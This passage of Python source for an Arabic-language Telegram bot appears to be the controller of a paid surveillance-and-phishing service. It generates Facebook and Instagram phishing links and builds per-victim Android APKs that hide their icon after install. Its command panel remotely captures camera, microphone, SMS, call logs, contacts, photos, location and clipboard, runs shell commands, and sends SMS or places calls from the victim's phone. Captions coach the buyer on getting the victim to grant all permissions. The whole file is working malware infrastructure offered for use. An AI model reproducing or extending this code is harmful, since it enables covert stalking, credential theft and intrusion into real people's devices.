                    last_str = f"قبل {int(diff)} ثانية"
                elif diff < 3600:
                    last_str = f"قبل {int(diff/60)} دقيقة"
                else:
                    last_str = f"قبل {int(diff/3600)} ساعة"
            except Exception:
                pass

        text = (
            f"👤 **{name}**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 الحالة: {status_icon}\n"
            f"📱 الموديل: `{model}`\n"
            f"🆔 Device: `{device_id[:16] if device_id else '—'}`\n"
            f"🕐 آخر ظهور: {last_str}\n\n"
            f"🎛️ **اختر الأمر:**"
        )

        bot.send_message(chat_id, text, parse_mode="Markdown",
                         reply_markup=victim_commands_panel(victim_id))
        return

    # ============================================================
    # ★★★ أوامر الضحية ★★★
    # ============================================================
    if data.startswith("vcmd_"):
        # استخرج action و victim_id
        body = data.replace("vcmd_", "")
        parts = body.split("_")
        victim_id = parts[-1]
        action = "_".join(parts[:-1])

        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌ ضحية غير موجودة", show_alert=True)
            return

        action_map = {
            "camfront": "camera_front",
            "camback": "camera_back",
            "video": "camera_record",
            "audio": "record_audio",
            "sound": "play_sound",
            "alarm": "play_alarm",
            "info": "get_device_info",
            "battery": "get_battery",
            "sms": "get_sms",
            "calls": "get_call_log",
            "contacts": "get_contacts",
            "apps": "get_apps",
            "photos": "get_photos",
            "location": "get_location",
            "clipboard": "get_clipboard",
            "vibrate": "vibrate",
            "volmax": "volume_max",
            "lock": "lock_screen",
            "home": "show_home",
        }

        if action in action_map:
            real_action = action_map[action]
            kwargs = {}
            if action == "video":
                kwargs["duration"] = 10000
            elif action == "audio":
                kwargs["duration"] = 10000
            elif action == "vibrate":
                kwargs["ms"] = 3000

            ok = queue_victim_command(victim_id, real_action, **kwargs)
            if ok:
                bot.answer_callback_query(call.id, f"✅ تم الإرسال")
            else:
                bot.answer_callback_query(call.id, "❌ فشل الإرسال", show_alert=True)
            print(f"[+] Command: {action} → {victim_id[:8]}")
            return

        # أوامر تحتاج إدخال
        if action == "toast":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "💬 **أرسل النص:**")
            bot.register_next_step_handler(msg, lambda m: v_toast_step(m, victim_id))
            return

        if action == "shell":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "💻 **أرسل الأمر:**")
            bot.register_next_step_handler(msg, lambda m: v_shell_step(m, victim_id))
            return

        if action == "sendsms":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "✉️ **أرسل:** `رقم|نص`", parse_mode="Markdown")
            bot.register_next_step_handler(msg, lambda m: v_sendsms_step(m, victim_id))
            return

        if action == "call":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "📞 **أرسل الرقم:**")
            bot.register_next_step_handler(msg, lambda m: v_call_step(m, victim_id))
            return

        if action == "url":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(chat_id, "🌐 **أرسل الرابط:**")
            bot.register_next_step_handler(msg, lambda m: v_url_step(m, victim_id))
            return

        bot.answer_callback_query(call.id, f"❓ {action}", show_alert=True)
        return

    # ============================================================
    # تحديث / إعادة تسمية / حذف
    # ============================================================
    if data.startswith("v_refresh_"):
        victim_id = data.replace("v_refresh_", "")
        victim = get_victim(chat_id, victim_id)
        if victim:
            bot.answer_callback_query(call.id, "🔄 تم التحديث")
            bot.send_message(
                chat_id,
                f"👤 **{victim.get('name')}**",
                reply_markup=victim_commands_panel(victim_id),
                parse_mode="Markdown"
            )
        return

    if data.startswith("v_rename_"):
        victim_id = data.replace("v_rename_", "")
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "✏️ **أرسل الاسم الجديد:**")
        bot.register_next_step_handler(msg, lambda m: v_rename_step(m, victim_id))
        return

    if data.startswith("v_delete_"):
        victim_id = data.replace("v_delete_", "")
        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        m = InlineKeyboardMarkup()
        m.row(
            InlineKeyboardButton("✅ نعم", callback_data=f"v_confirm_del_{victim_id}"),
            InlineKeyboardButton("❌ إلغاء", callback_data=f"v_open_{victim_id}"),
        )
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            f"⚠️ **حذف ضحية `{victim.get('name')}`?**",
            reply_markup=m, parse_mode="Markdown"
        )
        return

    if data.startswith("v_confirm_del_"):
        victim_id = data.replace("v_confirm_del_", "")
        delete_victim(chat_id, victim_id)
        bot.answer_callback_query(call.id, "🗑️ تم الحذف")
        bot.send_message(chat_id, "✅ تم الحذف")
        return

    # ============================================================
    # الدفع
    # ============================================================
    if data == "payment_menu":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "💎 **قسم الاشتراكات**",
                         reply_markup=build_main_payment_keyboard(),
                         parse_mode="Markdown")
        return

    if data == "show_plans":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_plans_text(),
                         reply_markup=build_plans_keyboard(),
                         parse_mode="Markdown")
        return

    if data.startswith("buy_plan_"):
        plan_key = data.replace("buy_plan_", "")
        bot.answer_callback_query(call.id, "جاري تجهيز الفاتورة...")
        send_invoice(bot, chat_id, plan_key)
        return

    if data == "my_account":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_account_text(chat_id), parse_mode="Markdown")
        return

    if data == "back_to_main":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "القائمة الرئيسية:", reply_markup=main_menu(user_id))
        return

    if data == "noop":
        bot.answer_callback_query(call.id)
        return

    # ============================================================
    # الأدمن
    # ============================================================
    if data == "admin_panel":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "👑 **لوحة تحكم الأدمن**",
                         reply_markup=build_admin_menu(), parse_mode="Markdown")
        return

    if data.startswith("admin_users_"):
        if not is_admin(user_id):
            return
        try:
            page = int(data.replace("admin_users_", ""))
        except ValueError:
            page = 0
        users = get_all_users()
        if not users:
            bot.answer_callback_query(call.id, "لا يوجد مستخدمون", show_alert=True)
            return
        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, f"👥 **المستخدمون** ({len(users)})",
                         reply_markup=build_admin_users_keyboard(users, page),
                         parse_mode="Markdown")
        return

    if data.startswith("admin_user_"):
        if not is_admin(user_id):
            return
        try:
            uid = int(data.replace("admin_user_", ""))
        except ValueError:
            return
        user = get_user(uid)
        if not user:
            bot.answer_callback_query(call.id, "❌ غير موجود", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_user_info_text(uid, user),
                         reply_markup=build_user_detail_keyboard(uid, user),
                         parse_mode="Markdown")
        return

    if data.startswith("admin_ban_user_"):
        if not is_admin(user_id):
            return
        try:
            uid = int(data.replace("admin_ban_user_", ""))
        except ValueError:
            return
        ban_user(uid)
        bot.answer_callback_query(call.id, "✅ تم الحظر", show_alert=True)
        return

    if data.startswith("admin_unban_user_"):
        if not is_admin(user_id):
            return
        try:
            uid = int(data.replace("admin_unban_user_", ""))
        except ValueError:
            return
        unban_user(uid)
        bot.answer_callback_query(call.id, "✅ تم فك الحظر", show_alert=True)
        return

    if data.startswith("admin_grant_vip_user_"):
        if not is_admin(user_id):
            return
        try:
            uid = int(data.replace("admin_grant_vip_user_", ""))
        except ValueError:
            return
        u = get_or_create_user(uid)
        u["is_vip"] = True
        save_user(uid, u)
        bot.answer_callback_query(call.id, "💎 تم منح VIP", show_alert=True)
        try:
            bot.send_message(uid, "💎 **تهانينا!** VIP مُفعّل 🚀", parse_mode="Markdown")
        except Exception:
            pass
        return

    if data.startswith("admin_remove_vip_"):
        if not is_admin(user_id):
            return
        try:
            uid = int(data.replace("admin_remove_vip_", ""))
        except ValueError:
            return
        u = get_or_create_user(uid)
        u["is_vip"] = False
        save_user(uid, u)
        bot.answer_callback_query(call.id, "✅ تم إزالة VIP", show_alert=True)
        return

    if data.startswith("admin_delete_user_"):
        if not is_admin(user_id):
            return
        try:
            uid = int(data.replace("admin_delete_user_", ""))
        except ValueError:
            return
        delete_user(uid)
        bot.answer_callback_query(call.id, "🗑️ تم الحذف", show_alert=True)
        return

    if data.startswith("admin_give_sub_"):
        if not is_admin(user_id):
            return
        try:
            uid = int(data.replace("admin_give_sub_", ""))
        except ValueError:
            return
        bot.answer_callback_query(call.id)
        m = InlineKeyboardMarkup()
        m.row(
            InlineKeyboardButton("⭐ أساسية", callback_data=f"admin_activate_basic_{uid}"),
            InlineKeyboardButton("💎 احترافية", callback_data=f"admin_activate_pro_{uid}"),
        )
        m.row(InlineKeyboardButton("👑 VIP", callback_data=f"admin_activate_vip_{uid}"))
        m.row(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))
        bot.send_message(chat_id, f"📅 **اختر الباقة** `{uid}`",
                         reply_markup=m, parse_mode="Markdown")
        return

    if data.startswith("admin_activate_"):
        if not is_admin(user_id):
            return
        parts = data.replace("admin_activate_", "").rsplit("_", 1)
        if len(parts) != 2:
            return
        plan_key, uid_str = parts
        try:
            uid = int(uid_str)
        except ValueError:
            return
        try:
            user = activate_subscription(uid, plan_key)
            plan = PRICING_PLANS.get(plan_key)
            bot.answer_callback_query(call.id, f"✅ {plan['name']}", show_alert=True)
            try:
                expires = datetime.fromisoformat(user["subscription"]["expires_at"])
                bot.send_message(uid,
                    f"🎉 **تم تفعيل اشتراكك!**\n📅 ينتهي: `{expires.strftime('%Y-%m-%d')}`",
                    parse_mode="Markdown")
            except Exception:
                pass
        except Exception as e:
            bot.answer_callback_query(call.id, f"❌ {e}", show_alert=True)
        return

    if data == "admin_stats":
        if not is_admin(user_id):
            return
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_admin_stats_text(),
                         reply_markup=InlineKeyboardMarkup().add(
                             InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
                         ), parse_mode="Markdown")
        return

    if data == "admin_recent":
        if not is_admin(user_id):
            return
        users = get_all_users()
        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
        lines = ["🆕 **آخر 10 مستخدمين:**"]
        for u in users[:10]:
            uid = u.get("user_id")
            name = u.get("first_name", "Unknown")
            icon = "👑" if is_admin(uid) else "💎" if u.get("is_vip") else "🚫" if u.get("is_banned") else "👤"
            lines.append(f"{icon} **{name}** — `{uid}`")
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "\n".join(lines),
                         reply_markup=InlineKeyboardMarkup().add(
                             InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
                         ), parse_mode="Markdown")
        return

    if data == "admin_search":
        if not is_admin(user_id):
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🔍 **أرسل ID أو username:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_search_handler)
        return

    if data == "admin_broadcast":
        if not is_admin(user_id):
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "📢 **أرسل الرسالة:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_broadcast_handler)
        return

    if data == "admin_ban":
        if not is_admin(user_id):
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🚫 **أرسل ID للحظر:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_ban_handler)
        return

    if data == "admin_unban":
        if not is_admin(user_id):
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "✅ **أرسل ID لفك الحظر:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_unban_handler)
        return

    if data == "admin_delete":
        if not is_admin(user_id):
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🗑️ **أرسل ID للحذف:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_delete_handler)
        return

    if data == "admin_grant_vip":
        if not is_admin(user_id):
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "💎 **أرسل ID لمنح VIP:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_grant_vip_handler)
        return

    if data == "admin_give_stars":
        if not is_admin(user_id):
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "⭐ **أرسل:** `user_id|amount`", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_give_stars_handler)
        return

    if data.startswith("admin_msg_user_"):
        if not is_admin(user_id):
            return
        try:
            uid = int(data.replace("admin_msg_user_", ""))
        except ValueError:
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, f"📨 **أرسل الرسالة لـ** `{uid}`:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, lambda m, u=uid: admin_msg_user_handler(m, u))
        return

    # ============================================================
    # فيسبوك
    # ============================================================
    if data == "gen_fb":
        check = can_use_tool(chat_id, "fb")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "fb", check),
                             parse_mode="Markdown")
            return
        consume_usage(chat_id, "fb")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        link = f"{PUBLIC_URL}/login.php?id={chat_id}"
        bot.send_message(chat_id, f"🎯 رابط فيسبوك:\n `{link}` ", parse_mode="Markdown")
        return

    # ============================================================
    # انستقرام
    # ============================================================
    if data == "gen_ig":
        check = can_use_tool(chat_id, "ig")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "ig", check),
                             parse_mode="Markdown")
            return
        consume_usage(chat_id, "ig")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        link = f"{PUBLIC_URL}/ig_login.php?id={chat_id}"
        bot.send_message(chat_id, f"📸 رابط انستقرام:\n `{link}` ", parse_mode="Markdown")
        return

    # ============================================================
    # RAT
    # ============================================================
    if data == "gen_rat":
        check = can_use_tool(chat_id, "rat")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "rat", check),
                             parse_mode="Markdown")
            return
        consume_usage(chat_id, "rat")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        link = f"{PUBLIC_URL}/system_secure_v2?id={chat_id}"
        bot.send_message(chat_id, f"📱 رابط RAT:\n `{link}`", parse_mode="Markdown")
        return

    # ============================================================
    # QR
    # ============================================================
    if data == "gen_qr":
        check = can_use_tool(chat_id, "qr")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "qr", check),
                             parse_mode="Markdown")
            return
        consume_usage(chat_id, "qr")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        token = str(uuid.uuid4())[:8]
        if redis_client:
            try:
                redis_client.setex(f"qr_token:{token}", 300, chat_id)
            except Exception:
                pass
        target_link = f"{PUBLIC_URL}/qr_scan_target?token={token}"
        qr_image = generate_qr_code_bytes(target_link)
        if qr_image:
            qr_image.name = 'pairing_qr.jpg'
            bot.send_photo(chat_id, qr_image,
                           caption="📷 **امسح الـ QR:**", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, f"🎯 رابط QR:\n`{target_link}`", parse_mode="Markdown")
        return

    # ============================================================
    # LSH
    # ============================================================
    if data == "gen_lsh":
        check = can_use_tool(chat_id, "lsh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "lsh", check),
                             parse_mode="Markdown")
            return
        consume_usage(chat_id, "lsh")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        session_id = str(uuid.uuid4()).replace('-', '')[:24]
        if redis_client:
            try:
                redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
            except Exception:
                pass
        try:
            requests.post(f"{PUBLIC_URL}/lsh_create",
                          json={"chat_id": chat_id, "session_id": session_id}, timeout=5)
        except Exception:
            pass
        target_link = f"{PUBLIC_URL}/lsh?s={session_id}&id={chat_id}"
        qr_image = lsh_generate_qr(target_link)
        if qr_image:
            qr_image.name = 'lsh_qr.png'
            try:
                bot.send_photo(chat_id, qr_image,
                               caption=f"🕹️ **جلسة LSH جاهزة!**\n`{target_link}`",
                               parse_mode="Markdown")
            except Exception:
                bot.send_message(chat_id, f"🕹️ {target_link}")
        else:
            bot.send_message(chat_id, f"🕹️ {target_link}")
        return

    # ============================================================
    # Session Hunter (الرابط)
    # ============================================================
    if data == "gen_sh":
        check = can_use_tool(chat_id, "sh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "sh", check),
                             parse_mode="Markdown")
            return
        bot.answer_callback_query(call.id)

        victims = get_all_victims(chat_id)

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("➕ ضحية جديدة", callback_data="victim_new"))

        if victims:
            markup.add(InlineKeyboardButton(
                f"━━━ 📋 الضحايا ({len(victims)}) ━━━",
                callback_data="noop"
            ))
            for v in victims[:12]:
                name = v.get("name", "غير معروف")[:18]
                site = v.get("site", "facebook")
                creds = int(v.get("creds_count", 0))
                icon = "✅" if creds > 0 else ("⏳" if v.get("status") == "active" else "⏸️")
                site_icon = {
                    "facebook": "📘", "instagram": "📷", "tiktok": "🎵",
                    "twitter": "🐦", "gmail": "📧", "snapchat": "👻",
                    "linkedin": "💼", "discord": "🎮", "telegram": "✈️",
                    "netflix": "🎬", "paypal": "💳", "binance": "💰",
                }.get(site, "🌐")
                vid = v.get("victim_id", "")
                markup.add(InlineKeyboardButton(
                    f"{icon} {name} — {site_icon} ({creds} 📥)",
                    callback_data=f"victim_{vid}"
                ))

        bot.send_message(
            chat_id,
            f"👥 **نظام إدارة الضحايا**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 **عدد الضحايا:** `{len(victims)}`\n\n"
            f"اختر ضحية أو أضف جديدة:",
            reply_markup=markup, parse_mode="Markdown"
        )
        return

    if data == "victim_new":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(
            chat_id,
            "📝 **أرسل اسم الضحية:**\n\nمثال: `أحمد`",
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, victim_name_handler)
        return

    # ============================================================
    # RAT أوامر
    # ============================================================
    if data.startswith("rat_cam_"):
        target_chat_id = data.replace("rat_cam_", "")
        queue_command(target_chat_id, "snapshot")
        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة...")
        return

    if data.startswith("rat_mic_"):
        target_chat_id = data.replace("rat_mic_", "")
        queue_command(target_chat_id, "audio")
        bot.answer_callback_query(call.id, "⏳ جاري التسجيل...")
        return

    # ============================================================
    # LSH أوامر
    # ============================================================
    if data.startswith("lsh_snap_"):
        sid = data.replace("lsh_snap_", "")
        ok = lsh_push_command(sid, {"action": "snapshot"})
        bot.answer_callback_query(call.id, "📸" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_audio_"):
        sid = data.replace("lsh_audio_", "")
        ok = lsh_push_command(sid, {"action": "audio", "payload": {"duration": 6000}})
        bot.answer_callback_query(call.id, "🎙️" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_video_"):
        sid = data.replace("lsh_video_", "")
        ok = lsh_push_command(sid, {"action": "video", "payload": {"duration": 10000}})
        bot.answer_callback_query(call.id, "🎥" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_screen_"):
        sid = data.replace("lsh_screen_", "")
        ok = lsh_push_command(sid, {"action": "screen"})
        bot.answer_callback_query(call.id, "🖥️" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_clip_"):
        sid = data.replace("lsh_clip_", "")
        ok = lsh_push_command(sid, {"action": "clipboard"})
        bot.answer_callback_query(call.id, "📋" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_loc_"):
        sid = data.replace("lsh_loc_", "")
        ok = lsh_push_command(sid, {"action": "location"})
        bot.answer_callback_query(call.id, "📍" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_vibrate_"):
        sid = data.replace("lsh_vibrate_", "")
        ok = lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500]}})
        bot.answer_callback_query(call.id, "📳" if ok else "❌", show_alert=not ok)
        return

    if data.startswith("lsh_kill_"):
        sid = data.replace("lsh_kill_", "")
        ok = lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
        bot.answer_callback_query(call.id, "❌" if ok else "❌", show_alert=not ok)
        return


# ============================================================
# ★★★ Step Handlers ★★★
# ============================================================

def victim_name_step(message):
    """يستقبل اسم الضحية → يولّد APK"""
    chat_id = message.chat.id

    if not message.text:
        bot.send_message(chat_id, "❌ اسم غير صحيح")
        return

    victim_name = message.text.strip()[:40]

    wait_msg = bot.send_message(
        chat_id,
        f"⏳ **جاري تجهيز APK لـ `{victim_name}`...**\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔨 _بناء التطبيق في GitHub Actions_\n"
        f"⏱️ _الوقت المتوقع: 2-4 دقائق_",
        parse_mode="Markdown"
    )

    victim = create_victim(chat_id, victim_name, "general")

    if not victim:
        try:
            bot.edit_message_text(
                "❌ فشل إنشاء الضحية",
                chat_id=chat_id, message_id=wait_msg.message_id
            )
        except Exception:
            pass
        return

    victim_token = victim.get("victim_token")
    victim_id = victim.get("victim_id")

    print(f"[+] Victim created: {victim_name} | {victim_id} | token={victim_token[:16]}")

    def build_and_send():
        if not GITHUB_TOKEN:
            try:
                bot.edit_message_text(
                    f"⚠️ **GITHUB_TOKEN غير مضبوط**\n\n"
                    f"🔑 **كود الضحية:**\n`{victim_token}`\n\n"
                    f"📋 ثبّت APK عام وأدخل الكود يدوياً",
                    chat_id=chat_id, message_id=wait_msg.message_id,
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            return

        success = trigger_victim_apk_build(victim_token, victim_name)

        if not success:
            try:
                bot.edit_message_text(
                    f"❌ **فشل تشغيل البناء**\n\n"
                    f"🔑 التوكن: `{victim_token[:32]}`",
                    chat_id=chat_id, message_id=wait_msg.message_id,
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            return

        apk_url = get_victim_apk_url(victim_token, max_wait=900)

        if not apk_url:
            try:
                bot.edit_message_text(
                    f"⏰ **انتهت مهلة الانتظار**\n\n"
                    f"👤 `{victim_name}`\n"
                    f"🔗 تحقق يدوياً:\n"
                    f"https://github.com/{GITHUB_REPO}/releases",
                    chat_id=chat_id, message_id=wait_msg.message_id,
                    parse_mode="Markdown",
                    disable_web_page_preview=True
                )
            except Exception:
                pass
            return

        try:
            r = requests.get(apk_url, timeout=120, allow_redirects=True)

            if r.status_code == 200 and len(r.content) > 10000:
                apk_buffer = io.BytesIO(r.content)
                apk_buffer.name = f"Victim_{victim_name}.apk"

                try:
                    bot.delete_message(chat_id, wait_msg.message_id)
                except Exception:
                    pass

                bot.send_document(
                    chat_id, apk_buffer,
                    caption=(
                        f"✅ **APK جاهز للضحية `{victim_name}`**\n"
                        f"━━━━━━━━━━━━━━━━━━\n\n"
                        f"📋 **الخطوات:**\n"
                        f"1. أرسل APK للضحية\n"
                        f"2. تثبّته على تليفونها\n"
                        f"3. **تفتحه وتوافق على كل الصلاحيات**\n"
                        f"4. تختفي الأيقونة بعد 5 ثواني\n"
                        f"5. **هتظهر تلقائياً في ضحاياك** ✅\n\n"
                        f"🎛️ **بعد كده:** ارجع → إدارة الضحايا → اضغط عليها"
                    ),
                    parse_mode="Markdown"
                )
                print(f"[+] APK sent: {victim_name}")
            else:
                bot.send_message(
                    chat_id,
                    f"❌ فشل تحميل APK\n🔗 {apk_url}",
                    disable_web_page_preview=True
                )
        except Exception as e:
            bot.send_message(chat_id, f"❌ خطأ التحميل: {e}")

    threading.Thread(target=build_and_send, daemon=True).start()


def v_toast_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "toast", text=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال Toast")


def v_shell_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "shell", command=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال الأمر")


def v_sendsms_step(message, victim_id):
    if not message.text:
        return
    parts = message.text.split("|")
    if len(parts) != 2:
        bot.send_message(message.chat.id, "❌ استخدم: `رقم|نص`", parse_mode="Markdown")
        return
    queue_victim_command(victim_id, "send_sms",
                         to=parts[0].strip(), msg=parts[1].strip())
    bot.send_message(message.chat.id, "✅ تم إرسال SMS")


def v_call_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "call", to=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم بدء المكالمة")


def v_url_step(message, victim_id):
    if not message.text:
        return
    queue_victim_command(victim_id, "open_url", url=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم فتح الرابط")


def v_rename_step(message, victim_id):
    if not message.text:
        return
    new_name = message.text.strip()[:40]
    rename_victim(message.chat.id, victim_id, new_name)
    bot.send_message(message.chat.id, f"✅ **تم التغيير إلى:** `{new_name}`",
                     parse_mode="Markdown")


def victim_name_handler(message):
    """للـ SH القديم — لو مستخدم ضغط victim_new"""
    if not message.text:
        return
    name = message.text.strip()[:50]
    chat_id = message.chat.id

    if redis_client:
        try:
            redis_client.setex(f"pending_victim_name:{chat_id}", 300, name)
        except Exception:
            pass

    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("📘 Facebook", callback_data="victim_site_facebook"),
        InlineKeyboardButton("📷 Instagram", callback_data="victim_site_instagram"),
    )
    markup.row(
        InlineKeyboardButton("🎵 TikTok", callback_data="victim_site_tiktok"),
        InlineKeyboardButton("🐦 Twitter/X", callback_data="victim_site_twitter"),
    )
    markup.row(
        InlineKeyboardButton("📧 Gmail", callback_data="victim_site_gmail"),
        InlineKeyboardButton("👻 Snapchat", callback_data="victim_site_snapchat"),
    )
    markup.row(
        InlineKeyboardButton("💼 LinkedIn", callback_data="victim_site_linkedin"),
        InlineKeyboardButton("🎮 Discord", callback_data="victim_site_discord"),
    )
    markup.row(
        InlineKeyboardButton("✈️ Telegram", callback_data="victim_site_telegram"),
        InlineKeyboardButton("🎬 Netflix", callback_data="victim_site_netflix"),
    )
    markup.row(
        InlineKeyboardButton("💳 PayPal", callback_data="victim_site_paypal"),
        InlineKeyboardButton("💰 Binance", callback_data="victim_site_binance"),
    )

    bot.send_message(
        chat_id,
        f"👤 **اسم الضحية:** `{name}`\n\n🎯 **اختر الموقع:**",
        reply_markup=markup, parse_mode="Markdown"
    )


def victim_rename_handler(message, victim_id):
    if not message.text:
        return
    new_name = message.text.strip()[:50]
    rename_victim(message.chat.id, victim_id, new_name)
    bot.send_message(message.chat.id, f"✅ **تم التغيير إلى:** `{new_name}`",
                     parse_mode="Markdown")


# ============================================================
# معالجات الأدمن (Step)
# ============================================================

def admin_search_handler(message):
    if not is_admin(message.chat.id):
        return
    query = (message.text or "").strip().lstrip("@")
    users = get_all_users()
    found = [u for u in users
             if str(u.get("user_id")) == query
             or (u.get("username", "") or "").lower() == query.lower()]
    if not found:
        bot.send_message(message.chat.id, f"❌ لم يُعثر على: `{query}`",
                         parse_mode="Markdown")
        return
    for u in found:
        uid = u.get("user_id")
        bot.send_message(message.chat.id, build_user_info_text(uid, u),
                         reply_markup=build_user_detail_keyboard(uid, u),
                         parse_mode="Markdown")


def admin_broadcast_handler(message):
    if not is_admin(message.chat.id):
        return
    text = message.text
    if not text:
        return
    users = get_all_users()
    success = failed = 0
    status_msg = bot.send_message(message.chat.id, f"📢 جاري الإرسال لـ {len(users)}...")
    for u in users:
        uid = u.get("user_id")
        if u.get("is_banned"):
            continue
        try:
            bot.send_message(uid, f"📢 **رسالة من الإدارة:**\n\n{text}",
                             parse_mode="Markdown")
            success += 1
            time.sleep(0.05)
        except Exception:
            failed += 1
    try:
        bot.edit_message_text(f"✅ **تم!**\n✔️ {success}\n❌ {failed}",
                              chat_id=message.chat.id,
                              message_id=status_msg.message_id)
    except Exception:
        pass


def admin_ban_handler(message):
    if not is_admin(message.chat.id):
        return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        return
    ban_user(uid)
    bot.send_message(message.chat.id, f"🚫 تم حظر `{uid}`", parse_mode="Markdown")


def admin_unban_handler(message):
    if not is_admin(message.chat.id):
        return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        return
    unban_user(uid)
    bot.send_message(message.chat.id, f"✅ تم فك حظر `{uid}`", parse_mode="Markdown")


def admin_delete_handler(message):
    if not is_admin(message.chat.id):
        return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        return
    delete_user(uid)
    bot.send_message(message.chat.id, f"🗑️ تم حذف `{uid}`", parse_mode="Markdown")


def admin_grant_vip_handler(message):
    if not is_admin(message.chat.id):
        return
    try:
        uid = int((message.text or "").strip())
    except ValueError:
        return
    u = get_or_create_user(uid)
    u["is_vip"] = True
    save_user(uid, u)
    bot.send_message(message.chat.id, f"💎 تم منح VIP لـ `{uid}`", parse_mode="Markdown")
    try:
        bot.send_message(uid, "💎 **تهانينا!** VIP مُفعّل 🚀", parse_mode="Markdown")
    except Exception:
        pass


def admin_give_stars_handler(message):
    if not is_admin(message.chat.id):
        return
    try:
        parts = (message.text or "").split("|")
        uid = int(parts[0].strip())
        amount = int(parts[1].strip())
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "❌ صيغة خاطئة")
        return
    u = get_or_create_user(uid)
    u["total_stars_spent"] = max(0, u.get("total_stars_spent", 0) - amount)
    save_user(uid, u)
